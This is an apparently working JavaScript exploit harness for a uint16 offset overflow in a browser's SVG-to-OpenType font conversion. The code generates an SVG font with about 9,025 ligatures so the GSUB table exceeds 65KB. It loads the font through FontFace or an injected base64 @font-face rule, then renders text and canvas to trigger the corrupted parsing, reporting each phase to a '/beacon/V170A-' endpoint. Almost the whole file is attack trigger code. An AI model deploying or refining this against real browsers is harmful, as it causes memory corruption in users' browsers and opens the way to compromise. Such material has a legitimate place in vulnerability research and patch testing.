// p170a — SVG font uint16 offset overflow
//
// SVGToOTFFontConversion.cpp Placeholder::populate() truncates offsets
// to uint16_t when delta > 65535. ASSERT stripped in release.
// Create SVG font with enough ligatures to push GSUB subtable > 65KB.
// The corrupted OTF offsets cause the font parser to read wrong locations.
//
// Beacon prefix: V170A-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V170A-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  // Phase 1: Check SVG font support
  var hasFontFace = typeof FontFace !== 'undefined';
  B('FONTFACE-' + (hasFontFace ? 'YES' : 'NO'));

  // Phase 2: Build SVG font with many ligatures
  // Each 2-char ligature adds ~8 bytes to GSUB subtable
  // Need >65536 bytes = ~8200 ligatures minimum
  // Use 90 base chars (U+0041-U+009A) = up to 8100 2-char ligatures
  // Plus add 3-char ligatures for extra size

  var BASE_START = 0x41; // 'A'
  var BASE_COUNT = 95;   // 95 base chars = 9025 possible 2-char combos

  B('BUILDING-' + BASE_COUNT);

  var parts = [];
  parts.push('<?xml version="1.0" standalone="yes"?>');
  parts.push('<svg xmlns="http://www.w3.org/2000/svg">');
  parts.push('<defs>');
  parts.push('<font id="TestFont" horiz-adv-x="500">');
  parts.push('<font-face font-family="SVGOverflow" units-per-em="1000" ascent="800" descent="-200"/>');
  parts.push('<missing-glyph horiz-adv-x="500" d="M50 0V800H450V0H50ZM100 50H400V750H100V50Z"/>');

  // Base glyphs
  for (var i = 0; i < BASE_COUNT; i++) {
    var ch = String.fromCharCode(BASE_START + i);
    var x1 = (i % 10) * 50;
    parts.push('<glyph unicode="' + ch + '" horiz-adv-x="500" d="M' + x1 + ' 0L' + (x1+100) + ' 0L' + (x1+100) + ' 800L' + x1 + ' 800Z"/>');
  }
  B('BASE-GLYPHS-' + BASE_COUNT);

  // Ligature glyphs: every 2-char combination of first 95 chars
  // This gives 95*95 = 9025 ligatures
  // Each adds ~8 bytes to GSUB = ~72KB > 65KB overflow!
  var ligCount = 0;
  for (var a = 0; a < BASE_COUNT; a++) {
    for (var b = 0; b < BASE_COUNT; b++) {
      var ch1 = String.fromCharCode(BASE_START + a);
      var ch2 = String.fromCharCode(BASE_START + b);
      parts.push('<glyph unicode="' + ch1 + ch2 + '" horiz-adv-x="800" d="M0 0L800 0L800 800L0 800Z"/>');
      ligCount++;
    }
  }
  B('LIGATURES-' + ligCount);

  parts.push('</font>');
  parts.push('</defs>');
  parts.push('</svg>');

  var svgText = parts.join('\n');
  B('SVG-SIZE-' + svgText.length);

  // Phase 3: Load via FontFace API
  if (!hasFontFace) {
    // Fallback: inject SVG into DOM
    B('FALLBACK-DOM');
    var div = document.createElement('div');
    div.innerHTML = '<style>@font-face { font-family: "SVGOverflow"; src: url("data:image/svg+xml;base64,' + btoa(svgText) + '") format("svg"); }</style>';
    document.head.appendChild(div);

    // Apply font and render to trigger parsing
    setTimeout(function() {
      var span = document.createElement('span');
      span.style.fontFamily = 'SVGOverflow';
      span.style.fontSize = '48px';
      span.textContent = 'ABCDEFGHIJ AABB ABCD';
      document.body.appendChild(span);
      B('RENDERED');

      setTimeout(function() {
        var w = span.offsetWidth;
        B('WIDTH-' + w);

        // Try to render ligatures
        var lig = document.createElement('span');
        lig.style.fontFamily = 'SVGOverflow';
        lig.style.fontSize = '48px';
        // Mix of base chars and ligature combos
        lig.textContent = 'AB CD EF GH IJ KL MN OP QR ST';
        document.body.appendChild(lig);

        setTimeout(function() {
          B('LIG-WIDTH-' + lig.offsetWidth);

          // Canvas render test
          try {
            var c = document.createElement('canvas');
            c.width = 800; c.height = 100;
            var ctx = c.getContext('2d');
            ctx.font = '48px SVGOverflow';
            ctx.fillText('ABCDEFGHIJKLMNOP', 10, 60);
            var px = ctx.getImageData(0, 0, 800, 100).data;
            var nz = 0;
            for (var p = 0; p < px.length; p += 4) if (px[p+3] > 0) nz++;
            B('CANVAS-PX-' + nz);
          } catch(e) {
            B('CANVAS-ERR-' + String(e).substring(0, 30));
          }

          B('DONE');
        }, 500);
      }, 500);
    }, 1000);

  } else {
    // FontFace API path
    B('FONTFACE-PATH');
    var blob = new Blob([svgText], { type: 'image/svg+xml' });
    var url = URL.createObjectURL(blob);

    var face = new FontFace('SVGOverflow', 'url(' + url + ')');
    face.load().then(function(loaded) {
      B('LOADED-OK');
      document.fonts.add(loaded);

      var span = document.createElement('span');
      span.style.fontFamily = 'SVGOverflow';
      span.style.fontSize = '48px';
      span.textContent = 'ABCDEFGHIJ AABB';
      document.body.appendChild(span);

      setTimeout(function() {
        B('WIDTH-' + span.offsetWidth);

        try {
          var c = document.createElement('canvas');
          c.width = 800; c.height = 100;
          var ctx = c.getContext('2d');
          ctx.font = '48px SVGOverflow';
          ctx.fillText('ABCDEFGHIJKLMNOP', 10, 60);
          var px = ctx.getImageData(0, 0, 800, 100).data;
          var nz = 0;
          for (var p = 0; p < px.length; p += 4) if (px[p+3] > 0) nz++;
          B('CANVAS-PX-' + nz);
        } catch(e) {
          B('CANVAS-ERR-' + String(e).substring(0, 30));
        }
        B('DONE');
      }, 500);
    }).catch(function(e) {
      B('LOAD-ERR-' + e.name + '-' + String(e.message).substring(0, 40));

      // SVG fonts may not work via FontFace — try @font-face in style
      B('RETRY-STYLE');
      var style = document.createElement('style');
      style.textContent = '@font-face { font-family: "SVGOverflow"; src: url("data:image/svg+xml;base64,' + btoa(svgText) + '") format("svg"); }';
      document.head.appendChild(style);

      var span = document.createElement('span');
      span.style.fontFamily = 'SVGOverflow';
      span.style.fontSize = '48px';
      span.textContent = 'ABCDEFGHIJ';
      document.body.appendChild(span);

      setTimeout(function() {
        B('STYLE-WIDTH-' + span.offsetWidth);
        B('DONE');
      }, 1000);
    });
  }
})();
